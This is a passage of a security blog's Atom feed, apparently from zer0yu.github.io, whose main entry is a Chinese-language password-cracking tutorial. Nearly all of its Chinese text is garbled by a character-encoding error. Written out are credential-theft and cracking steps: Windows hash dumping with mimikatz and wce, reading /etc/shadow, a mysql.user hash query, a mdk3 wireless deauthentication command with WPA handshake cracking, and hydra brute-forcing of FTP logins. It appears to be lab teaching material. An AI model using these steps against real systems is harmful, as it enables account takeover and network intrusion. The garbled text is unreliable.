        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;PHPæ˜¯ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨çš„è„šæœ¬è¯­è¨€ï¼Œå°¤å…¶é€‚åˆäºwebå¼€å‘ã€‚å…·æœ‰è·¨å¹³å°ï¼Œå®¹æ˜“å­¦ä¹ ï¼ŒåŠŸèƒ½å¼ºå¤§ç­‰ç‰¹ç‚¹ï¼Œæ®ç»Ÿè®¡å…¨ä¸–ç•Œæœ‰è¶…è¿‡34%çš„ç½‘ç«™æœ‰phpçš„åº”ç”¨ï¼Œ
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>å¯†ç ç ´è§£ç³»åˆ—</title>
    <link href="http://zer0yu.github.io/2017/10/28/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97/"/>
    <id>http://zer0yu.github.io/2017/10/28/å¯†ç ç ´è§£ç³»åˆ—/</id>
    <published>2017-10-28T11:44:04.000Z</published>
    <updated>2017-12-02T11:52:31.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬æ–‡æ€»ç»“äº†æœ‰å…³Windowså¯†ç ã€Linuxå¯†ç ã€ç½‘ç»œè®¾å¤‡å¯†ç ã€æ•°æ®åº“å¯†ç ã€æ— çº¿ç½‘ç»œå¯†ç ã€webåº”ç”¨ç™»é™†å¯†ç çš„ç ´è§£ä»¥åŠåœ¨çº¿æ‰«ææœåŠ¡çš„å¯†ç ç ´è§£ã€‚</p><h3 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h3><p>####1.windowså¯†ç ç ´è§£</p><p>è·å–å¯†ç ï¼ˆæŠ“å–HASHï¼‰ï¼špwdumpã€wceã€mimikatz</p><p>ç ´è§£å¯†ç ï¼šhashcatã€LC5ã€SAMInside.exeã€Ophcrackã€mimikatzã€hashsuite</p><p>å¯†ç æŠ“å–ï¼š</p><p>ç¯å¢ƒï¼šwindows7</p><p>å‰æï¼šå·²ç»è·å–rootæƒé™</p><p>å·¥å…·ï¼šmimikatz</p><p>æ“ä½œï¼š</p><p>åŸç†æ˜¯ä»lsass.exeè¿›ç¨‹ä¸­ç›´æ¥è·å–å¯†ç ä¿¡æ¯è¿›è¡Œç ´è§£ï¼Œè€Œä¸”è¯¥ç ´è§£åº”è¯¥å¹¶éç©·ä¸¾æ–¹å¼ï¼Œè€Œæ˜¯ç›´æ¥æ ¹æ®ç®—æ³•è¿›è¡Œåå‘è®¡ç®—ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/9BDC799D-7107-4E3A-86CB-E65207AB9637.png" alt="9BDC799D-7107-4E3A-86CB-E65207AB9637"></p><p>å¯†ç æå–ï¼š</p><p>åŸå› ï¼šä¸ºäº†è¿›è¡Œå£ä»¤ç ´è§£ï¼Œå¿…é¡»é¦–å…ˆè¿è¡Œä¸€ä¸ªå·¥å…·ï¼Œå°†Windowså£ä»¤ä»SAMæ–‡ä»¶ä¸­æå–å‡ºæ¥ï¼Œåšè¿™ä¸€æ­¥å·¥ä½œçš„åŸå› åœ¨äºWindowsè¿è¡Œè¿‡ç¨‹ä¸­SAMè¢«é”å®šï¼Œä¸èƒ½ç›´æ¥å¤åˆ¶æˆ–ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶(å³ä½¿æœ‰ç®¡ç†å‘˜æƒé™ä¹Ÿä¸è¡Œ)ã€‚</p><p>ç¯å¢ƒï¼šwindows10ï¼ˆæå–hashï¼‰ã€Windows7ï¼ˆç ´è§£hashï¼‰</p><p>å·¥å…·ï¼šPwdump7ï¼Œwceï¼ˆWindows Credentials Editorï¼‰</p><p>æ“ä½œï¼š</p><p>ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Pwdump7ï¼Œä»è€Œè·å¾—Windowså£ä»¤</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.09.05.png" alt="img"></p><p>ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€wceï¼Œä»è€Œè·å¾—Windowsçš„NTML HASH</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.10.25.png" alt="img"></p><p>è¿˜å¯ä»¥åˆ©ç”¨wceç›´æ¥è·å–Windowsçš„å¯†ç ï¼ˆ-wå‚æ•°æ˜¯é€šè¿‡æ‘˜è¦å¼è®¤è¯ç¼“å­˜ä¸€ä¸ªæ˜æ–‡çš„å¯†ç ï¼‰ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/BDD60E9E-A4AA-4443-B846-B2217A7A0206.png" alt="img"></p><p>å¯†ç ç ´è§£ï¼š</p><p>ç¯å¢ƒï¼šWindows10ï¼ˆCPUï¼ši5ï¼›GPUï¼šgtx860ï¼‰</p><p>å·¥å…·ï¼šhashcatã€hashsuite</p><p>æ“ä½œï¼š</p><p>1.ä½¿ç”¨hashcatè¿›è¡Œå¯†ç çš„ç ´è§£</p><p>hashcatå‚æ•°ç®€ä»‹ï¼š</p><p>-m è¿™ä¸ªæ˜¯æŒ‡å®šç ´è§£çš„hashçš„ç±»å‹ï¼Œå…·ä½“çš„ç±»å‹å¯ä»¥åœ¨â€“helpå‚æ•°ä¸­çœ‹åˆ°ã€‚ é»˜è®¤æ˜¯0ä¹Ÿå°±æ˜¯MD5ï¼Œè€ŒNTLMåˆ™æ˜¯1000ã€‚ </p><p>-a æŒ‡å®šç ´è§£çš„æ¨¡å¼ï¼Œé»˜è®¤æ˜¯å­—å…¸æ¨¡å¼ </p><p>-o è¾“å‡ºæ–‡ä»¶ï¼Œç ´è§£æˆåŠŸçš„å¯†ç å­˜æ”¾çš„æ–‡ä»¶ </p><p>â€“removeç§»é™¤ç ´è§£æˆåŠŸçš„hashï¼Œå½“hashæ˜¯ä»æ–‡æœ¬ä¸­è¯»å–æ—¶æœ‰ç”¨ï¼Œé¿å…è‡ª å·±æ‰‹å·¥ç§»é™¤å·²ç»ç ´è§£çš„hash</p><p>â€“username å¿½ç•¥ç”¨æˆ·åï¼Œå¦‚æœä½ çš„hashæ–‡ä»¶ä¸­æ˜¯username:hashè¿™ç§æ ¼å¼åª éœ€è¦æŒ‡å®šè¿™ä¸ªå‚æ•°ï¼Œå°±ä¸éœ€è¦å†æ‰‹å·¥ç¼–è¾‘äº† </p><p>-r æŒ‡å®šè§„åˆ™æ–‡ä»¶ï¼Œå­—å…¸æ ¹æ®è§„åˆ™æ–‡ä»¶åšå˜å½¢ï¼Œç”¨äºç ´è§£ç›¸ä¼¼å¯†ç å½“-aæŒ‡å®šä¸º3 æ—¶ï¼Œå°±æ˜¯æš´åŠ›ç ´è§£æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¸‹éœ€è¦è‡ªå·±æŒ‡å®šmaskå’Œé•¿åº¦ã€‚</p><p>Hashcat-plusä¸­ä»¥?lè¡¨ç¤ºå°å†™å­—æ¯ï¼Œ?dè¡¨ç¤ºæ•°å­—ï¼Œ?uè¡¨ç¤ºå¤§å†™å­—æ¯ï¼Œ?sè¡¨ç¤ºæ‰€æœ‰å¯æ‰“å°ç¬¦å·ï¼Œ?aä»£è¡¨æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ï¼Œå®ƒç­‰äº?l?u?d?såŠ åœ¨ä¸€èµ·ã€‚ </p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028814.png" alt="img"></p><p>2.ä½¿ç”¨SAMInside.exeè¿›è¡Œå¯†ç ç ´è§£</p><p>ç¯å¢ƒï¼šWindows10</p><p>1ï¼‰ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½è¿è¡ŒSAMInside.exe</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028815.png" alt="img"></p><p>2ï¼‰ä½ å¯ä»¥é€‰æ‹©ä½¿ç”¨Pwdump7è·å–å£ä»¤ä¹‹åå°†å…¶å¯¼å…¥SAMInside.exeè¿›è¡Œç ´è§£ï¼›æˆ–è€…ä½¿ç”¨SAMInside.exeæ¥ç›´æ¥è·å–æœ¬åœ°å£ä»¤è¿›è¡Œç ´è§£ï¼ˆæœ¬ä¾‹ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ï¼Œç‚¹å‡»ä¸‰ä¸ªå°äººçš„å›¾æ ‡ç„¶åé€‰æ‹©import local users via schedulerå°†æœ¬åœ°ç”¨æˆ·çš„hashå¯¼å‡ºæ¥ï¼‰ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62EA4762-1EEB-4C95-B04D-A092175F1118.png" alt="img"></p><p>3ï¼‰é€‰æ‹©ç”¨æˆ·åŠ è½½å­—å…¸æ¥è¿›è¡Œçˆ†ç ´ï¼Œæœ€ç»ˆå¯ä»¥çœ‹åˆ°å·²ç»ç ´è§£äº†å£ä»¤</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/B20BF1A6-DA9E-43C2-AA15-DC90419A748F.png" alt="img"></p><p>æ³¨ï¼šç”±äºæˆ‘ä¹‹å‰è½½å…¥å­—å…¸ç ´è§£äº†æœ¬åœ°å¯†ç æ‰€ä»¥åœ¨æ¯æ¬¡å¯¼å…¥æ—¶å‡ä¼šæ˜¾ç¤ºå·²ç»ç ´è§£äº†å¯†ç </p><p>3.ä½¿ç”¨hashsuiteå¯ä»¥ç›´æ¥è¿›è¡Œwindowsçš„NTML HASHçš„æŠ“å–ä¸ç ´è§£ã€‚ä½†æ˜¯å‰æä¾æ—§æ˜¯åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿›è¡Œ</p><p>ç¯å¢ƒï¼šwindows10</p><p>1ï¼‰é¦–å…ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œhashsuite</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028818.png" alt="img"></p><p>2ï¼‰å¯¼å…¥è¦ç ´è§£çš„å£ä»¤ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å¯¼å…¥æœ¬åœ°çš„å£ä»¤ï¼ˆé€‰æ‹©åè½¯ä»¶ä¼šè‡ªåŠ¨å°†å£ä»¤è¿›è¡Œæå–ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028819.png" alt="img"></p><p>3ï¼‰ä¹‹åæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨å­—å…¸ç ´è§£çš„æ–¹å¼å¯¹è´¦æˆ·Assassin001çš„å£ä»¤è¿›è¡Œç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028820.png" alt="img"></p><p>####2.Linuxå¯†ç ç ´è§£</p><p>çŸ¥è¯†æ¦‚è¦ï¼š</p><p>â–¶ head -n 2 /etc/passwd</p><p>root;x:0:0:root:/root:/usr/bin/zsh</p><p>daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin</p><p>ä»¥â€:â€åˆ†éš”ï¼Œå…±æœ‰ä¸ƒä¸ªå­—æ®µï¼š</p><p>1.è´¦å·åç§°ï¼›2.å¯†ç ï¼ˆLinuxæ—©æœŸå¯†ç å­˜æ”¾åœ°ï¼Œç°åœ¨å‡å­˜åœ¨/etc/shadowä¸­ï¼‰ï¼›3.UIDï¼ˆç”¨æˆ·æ ‡è¯†ç¬¦ï¼‰ï¼›4.GIDï¼›5.ç”¨æˆ·ä¿¡æ¯è¯´æ˜åˆ—ï¼›6.ä¸»æ–‡ä»¶å¤¹ï¼›7.shell</p><p>â–¶ head -n 2 /etc/shadow</p><p>root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7:::</p><p>daemon:*:17043:0:99999:7:::</p><p>ä»¥â€:â€åˆ†éš”ï¼Œå…±æœ‰ä¹ä¸ªå­—æ®µï¼š</p><p>1.è´¦å·åç§°ï¼›2.å¯†ç ï¼›3.æœ€è¿‘æ›´æ–°å¯†ç çš„æ—¥æœŸï¼›4.å¯†ç ä¸å¯è¢«æ›´åŠ¨çš„å¤©æ•°ï¼›5.å¯†ç éœ€è¦é‡æ–°æ›´æ”¹çš„å¤©æ•°ï¼›6.å¯†ç éœ€è¦æ›´æ”¹æœŸé™å‰çš„è­¦å‘Šå¤©æ•°ï¼›7.å¯†ç è¿‡æœŸåçš„è´¦å·å®½é™æ—¶é—´ï¼›8.è´¦å·å¤±æ•ˆæ—¥æœŸï¼›9.ä¿ç•™</p><p>å¯†ç æŠ“å–ï¼š</p><p>ç¯å¢ƒï¼škali linux</p><p>å‰æï¼šå·²ç»è·å–rootæƒé™(å¯ä»¥ä½¿ç”¨dirtycow.cç­‰0dayè¿›è¡ŒLinuxçš„ææƒæ“ä½œ)</p><p>å·¥å…·ï¼šmimipenguin(Linuxä¸‹çš„mimikatz)</p><p>æ“ä½œï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.28.10.png" alt="img"></p><p>å¯†ç ç ´è§£ï¼š</p><p>ç¯å¢ƒï¼škali linux</p><p>å‰æï¼šå·²ç»è·å–rootæƒé™(å¯ä»¥ä½¿ç”¨dirtycow.cç­‰0dayè¿›è¡ŒLinuxçš„ææƒæ“ä½œ)</p><p>å·¥å…·ï¼šJohn the ripper</p><p>æ“ä½œï¼š</p><p>1.ä½¿ç”¨unshadowå‘½ä»¤åˆ›å»º1ä¸ªå«æœ‰ç”¨æˆ·åå’Œå¯†ç è¯¦ç»†ä¿¡æ¯çš„æ–‡ä»¶</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.25.01.png" alt="img"></p><p>2.ä½¿ç”¨Johnæ¥ç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.29.10.png" alt="img"></p><p>####3.ç½‘ç»œè®¾å¤‡å¯†ç ç ´è§£</p><p>ç¯å¢ƒï¼šwindows7</p><p>å·¥å…·ï¼šCain</p><p>æ“ä½œï¼š</p><p>ç ´è§£Ciscoä¸­Password 7åŠ å¯†ï¼Œå¯†æ–‡ä¸º052C3C5F70420F1A0E</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028822.png" alt="img"></p><p>ç¯å¢ƒï¼škali linux</p><p>å·¥å…·ï¼šJohn the ripper</p><p>æ“ä½œï¼š</p><p>1.å°†å¯†æ–‡æ•´ç†æˆcisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211ï¼Œä¿å­˜åœ¨æ–‡ä»¶ä¸­ç„¶åä½¿ç”¨johnè¿›è¡Œç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028823.png" alt="img"></p><p>####4.æ•°æ®åº“å¯†ç ç ´è§£</p><p>ç¯å¢ƒï¼šwindows10 MSSQLæ•°æ®åº“</p><p>å·¥å…·ï¼šCain</p><p>æ“ä½œï¼š</p><p>1.æ·»åŠ Hashåˆ°é˜Ÿåˆ—</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028825.png" alt="img"></p><p>2.å¼€å§‹æš´åŠ›ç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028826.png" alt="img"></p><p>ç¯å¢ƒï¼šwindows10  MYSQLæ•°æ®åº“</p><p>å·¥å…·ï¼šCain</p><p>æ“ä½œï¼š</p><p>1.æ‰§è¡ŒSELECT password,USER() FROM mysql.user;æ¥è·å–å¯†æ–‡</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028827.png" alt="img"></p><p>2.å°†MYSQLçš„å¯†æ–‡å¯¼å…¥Cain</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028828.png" alt="img"></p><p>3.ä½¿ç”¨å­—å…¸æ”»å‡»æ¨¡å¼è¿›è¡Œæ”»å‡»</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028829.png" alt="img"></p><p>ç¯å¢ƒï¼šwindows10 Oracleæ•°æ®åº“</p><p>å·¥å…·ï¼šCain</p><p>æ“ä½œï¼š</p><p>1.å¯¼å…¥Oracleæ•°æ®åº“è´¦å·å¯†ç </p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028830.png" alt="img"></p><p>2.è¿›è¡Œæš´åŠ›ç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028831.png" alt="img"></p><p>####5.æ— çº¿å¯†ç ç ´è§£</p><p>ç¯å¢ƒï¼škali linux ã€WPA/WPA2 PSKåŠ å¯†  æ— çº¿è·¯ç”±å™¨  TP-LINK_4D16ã€Windows10ï¼ˆhashcatè¿›è¡ŒGPUè¿ç®—ï¼‰</p><p>å·¥å…·ï¼šå¤–ç½®USBæ— çº¿ç½‘å¡  </p><p>æ“ä½œï¼š</p><ol><li>æŠŠç½‘å¡åˆ‡æ¢ä¸ºç›‘å¬æ¨¡å¼</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028835.png" alt="img"></p><p>2.ç›‘å¬ç½‘ç»œæµé‡ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -w file wlan0mon</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028836.png" alt="img"></p><ol start="3"><li>ä½¿ç”¨mdk3ï¼Œ å¼ºåˆ¶æ–­çº¿è·¯ç”±çš„æ‰€æœ‰é“¾æ¥ï¼Œ æ­¤æ¬¡æ“ä½œæ˜¯ä¸ºäº†èƒ½è®©aircrackæŠ“åˆ°wifiçš„æ¡æ‰‹ä¿¡æ¯ ï¼Œ -cä¸ºéœ€è¦å¼ºåˆ¶æ–­çº¿çš„ä¿¡é“ï¼š</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 wlan0mon d -c 11</span><br></pre></td></tr></table></figure><p>è¿‡äº†å‡ åˆ†é’Ÿï¼Œ å¯ä»¥çœ‹åˆ°ï¼Œ ç”¨æˆ·é‡æ–°è¿æ¥ä¸Šäº†901è·¯ç”±ï¼Œ æˆ‘ä»¬ä¹Ÿæ•è·åˆ°äº†handshakeä¿¡æ¯ï¼Œ ä¸Šé¢airodump-ngçš„å‘½ä»¤çª—å£é¡¶éƒ¨å‡ºç°äº†ä»¥ä¸‹ä¿¡æ¯ WPA handshake  ï¼Œæ­¤æ—¶ç›´æ¥ctrlï¼‹c ï¼Œåœæ­¢æ•è·ä¿¡æ¯</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028837.png" alt="img"></p><p>åœ¨kaliçš„Homeç›®å½•ä¸‹ç”Ÿæˆäº†äº†å‡ ä¸ªæ–‡ä»¶ ï¼Œæ­¤æ—¶çš„file-01.capä¸ºæœ€é‡è¦çš„æ–‡ä»¶ï¼š</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028838.png" alt="img"></p><p>4.æŠŠæ–‡ä»¶è½¬æ¢ä¸ºhccapxæ ¼å¼ï¼Œ æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªç½‘ç«™ï¼š<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">https://hashcat.net/cap2hccapx/</a> ï¼Œ ç„¶åé€‰æ‹©capæ–‡ä»¶å¹¶ç‚¹å‡»covertæŒ‰é’®ï¼Œ å¹¶ä¸‹è½½ä¸€ä¸ªhccapxæ ¼å¼çš„æ–‡ä»¶</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028839.png" alt="img"></p><p>5.ç½‘é¡µä¼šè¿”å›ä¸€ä¸ªhccapxçš„æ–‡ä»¶ï¼Œ ä½¿ç”¨hashcatå‘½ä»¤ç ´è§£ï¼Œ å‚æ•°dict.txtä¸ºç”Ÿæˆçš„å­—å…¸æ–‡ä»¶ ï¼Œ -må‚æ•°2500ä»£è¡¨ç ´è§£çš„æ–¹å¼ä¸ºWPA/WPA2ï¼Œ 999.hccapxä¸ºç”Ÿæˆçš„æ–‡ä»¶ï¼Œ æœ€åç ´è§£å‡ºæ¥çš„å¯†ç ä¸ºwhitehatï¼š</p><p>PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028840.png" alt="img"></p><p>####6.webåº”ç”¨ç ´è§£</p><p>ç¯å¢ƒï¼šWindows10ï¼ˆphpstudyæ­å»ºæ¼æ´é¶åœºDVWAçš„çˆ†ç ´æ¨¡å—ï¼‰</p><p>å·¥å…·ï¼šburpsuite</p><p>æ“ä½œï¼š</p><p>1.ä½¿ç”¨burpsuiteæŠ“å–ç™»å½•æ—¶å€™çš„æ•°æ®åŒ…</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.39.49.png" alt="img"></p><p>2.å°†æ•°æ®åŒ…å‘é€è‡³Intruderæ¨¡å—å¹¶å¯¹æ”»å‡»ç‚¹è¿›è¡Œæ ‡æ³¨</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.02.png" alt="img"></p><p>3.è½½å…¥æ”»å‡»å­—å…¸å¹¶è¿›è¡Œæš´åŠ›ç ´è§£</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.13.png" alt="img"></p><p>4.æš´åŠ›ç ´è§£åæ•ˆæœ</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.41.42.png" alt="img"></p><p>5.éªŒè¯ç ´è§£å¯†ç æ˜¯å¦æ­£ç¡®ï¼ˆä¸€èˆ¬è§‚å¯ŸLengthå’ŒStatusæ¥åˆ¤æ–­æ­£ç¡®çš„å¯†ç ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.07.png" alt="img"></p><p>6.å¦‚æœå¯†ç ä¸æ­£ç¡®çš„é¡µé¢æˆªå›¾</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.20.png" alt="img"></p><p>ç¯å¢ƒï¼šWindows7</p><p>å·¥å…·ï¼šAWVS 10.5ç‰ˆæœ¬</p><p>æ“ä½œï¼š</p><p>1.è®¾ç½®æµè§ˆå™¨ä»£ç†è®¿é—®ç™»å½•ç•Œé¢ä½¿ç”¨burpsuiteæŠ“å–ç™»å½•è¯·æ±‚åŒ…</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028850.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028851.png" alt="img"></p><p>2.åœ¨AWVSæ‰«æå™¨ä¸­çš„HTTP Fuzzeræ¨¡å—å¡«å…¥åˆšæŠ“çš„ç™»å½•è¿‡ç¨‹çš„HTTPæ•°æ®åŒ…</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028852.png" alt="img"></p><p>3.åœ¨Generatorä¸­å¯ä»¥çœ‹åˆ°å¾ˆå¤šæ–¹å¼,å¯ä»¥ä½¿ç”¨AWVSè‡ªå¸¦çš„ç”Ÿæˆå™¨,ä¹Ÿå¯ä»¥é€‰æ‹©File Generatoræ¥ä½¿ç”¨è‡ªå·±ç”Ÿæˆçš„å­—å…¸.è¿˜å¯ä»¥è®¾å®šæ˜¯å¦ç¼–ç .æœ€ååœ¨éœ€è¦ç©·ä¸¾çš„åœ°æ–¹æŒ‡å®šå˜é‡,å¯¹åº”çš„æ˜¯ä½ Generatorçš„nameå±æ€§.å›¾ä¸­çš„è“è‰²å­—ä½“éƒ¨åˆ†.</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028853.png" alt="img"></p><p>4.ç‚¹å‡»startï¼Œè§‚å¯Ÿå“åº”ä½“å¯ä»¥çœ‹å‡ºçˆ†ç ´æˆåŠŸå¯†ç ä¸ºpassword</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028854.png" alt="img"></p><p>####7.åœ¨çº¿æ‰«æç ´è§£hydra</p><p>ç¯å¢ƒï¼šWindows10ï¼ˆFileZilla Serveræ­å»ºçš„ftpæœåŠ¡å™¨ï¼‰ã€kali linuxï¼ˆé¢„è£…äº†hydraï¼‰</p><p>æµ‹è¯•ç”¨æˆ·ï¼štestï¼š123456</p><p>æ“ä½œï¼š</p><p>1ï¼‰å¯åŠ¨ftpæœåŠ¡ï¼Œå¯åŠ¨æˆåŠŸåå¯ä»¥ä½¿ç”¨æˆ‘æ·»åŠ çš„æµ‹è¯•è´¦æˆ·ç™»å½•ftpè¯»å–æˆ‘ç”µè„‘Eç›˜çš„æ–‡ä»¶</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028855.png" alt="img"></p><p>2ï¼‰ä½¿ç”¨hydraæ¥è¿›è¡Œçˆ†ç ´</p><p>å‘½ä»¤ä¸ºï¼š</p><p>hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp</p><p>-l LOGIN å°å†™ï¼Œç”¨äºæŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£</p><p>-L FILE å¤§å†™ï¼Œç”¨äºæŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·åå­—å…¸</p><p>-p PASS å°å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸</p><p>-P FILE å¤§å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç å­—å…¸</p><p>-vVä¸ºæ˜¾ç¤ºè¯¦ç»†çš„çˆ†ç ´è¿‡ç¨‹</p><p>-e ns é¢å¤–çš„é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šè´¦æˆ·å’Œå¯†ç è¯•æ¢</p><p>æœ€ååŠ ä¸Šç›®æ ‡ipä»¥åŠéœ€è¦è¿›è¡Œçˆ†ç ´çš„åè®®å³å¯</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028856.png" alt="img"></p><p>3ï¼‰æ˜¾ç¤ºæˆåŠŸåè¿›è¡Œç™»å½•éªŒè¯ï¼Œå‘ç°å¯ä»¥æˆåŠŸç™»å½•</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028857.png" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h3&gt;&lt;p&gt;æœ¬æ–‡æ€»ç»“äº†æœ‰å…³Windowså¯†ç ã€Linuxå¯†ç ã€ç½‘ç»œè®¾å¤‡å¯†ç ã€æ•°æ®åº“å¯†ç ã€æ— çº¿ç½‘ç»œå¯†ç ã€webåº”ç”¨ç™»é™†å¯†ç çš„ç ´è§£ä»¥åŠåœ¨çº¿æ‰«ææœåŠ¡çš„å¯†ç ç ´è§£
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Webugæ¸—é€åŸºç¡€æ•™ç¨‹</title>
    <link href="http://zer0yu.github.io/2017/10/24/Webug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://zer0yu.github.io/2017/10/24/Webugæ¸—é€åŸºç¡€æ•™ç¨‹/</id>
    <published>2017-10-24T08:14:18.000Z</published>
    <updated>2017-12-02T11:54:21.000Z</updated>
    
